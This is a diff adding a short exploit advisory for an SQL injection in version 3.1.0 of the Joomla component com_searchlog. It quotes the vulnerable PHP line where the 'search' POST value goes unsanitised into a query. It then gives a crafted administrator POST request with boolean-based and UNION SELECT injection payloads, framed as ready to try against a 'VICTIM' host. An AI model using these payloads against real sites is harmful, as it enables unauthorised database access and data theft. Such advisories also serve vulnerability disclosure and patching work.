@@ -1,0 +1,54 @@
+#Exploit Title:		Joomla Component com_searchlog SQL Injection
+
+#Date:			05/06/2010 
+
+#Author:		d0lc3	d0lc3x[at]gmail[dom]com
+
+#Software Link:		http://www.kanich.net/radio/site/searchlog/searchlog-download
+
+#Version:		3.1.0
+
+#Tested on:		Linux ubuntu32 2.6.32-22-generic x64
+
+#Summary:
+	
+
+	Good nights, at this occassion  we have other not-saned POST variable on 
+	administrator/components/com_searchlog/models/log.php, line 30:
+...
+$search = $mainframe->getUserStateFromRequest($option . '.search', 'search', '', 'string');	//wtf!?
+$this->filter_actid = $mainframe->getUserStateFromRequest($option .'actid','actid',0,'int');
+$data->search = JString::strtolower($search);	//wtf!?
+$callbase = JRequest::getInt('callbase', 1);
+$newact =JRequest::getString('newact');
+$data->newact = "";
+if ($task=="" and $newact!="") {
+$data->newact = $newact;
+}if ($task == 'upload' or $task == 'savenew') {
+$data->sort = 'dates';
+$limitstart = 0;
+}else {
+$data->sort = JRequest::getVar('sort', 'calls');
+}if ($data->search) {
+$where[] = "(LOWER( m.call ) LIKE '$data->search%' OR LOWER( m.call ) LIKE '%/$data->search%')"; //likely SQLi
+...
+
+	In order to exploit it, i advice programming script for it :P but if only you want try vuln, to change POST request on HTTP header:
+
+http://VICTIM/administrator/index.php?option=com_searchlog&act=log
+
+POST /administrator/index.php?option=com_searchlog&act=log HTTP/1.1
+Host: VICTIM
+Content-Type: application/x-www-form-urlencoded
+Content-Length: xxx
+search=[SQLi]
+&sort=calls&limit=20&limitstart=0&option=com_searchlog&act=log&task=&callbase=1&boxchecked=1&hidemainmenu=0
+
+	Where [SQLi] = someLogExisting') and 1=1# => true
+		       someLogExisting') and 1=2# => false
+
+	UNION SQLi = someLogExisting') union select 1,2,3,4,5,6,7,8#
+
+
+
+by r0i  by r0i  by r0i  by r0i  by r0i  by r0i  by r0i  by r0i  by r0i  by r0i  by r0i  by r0i 
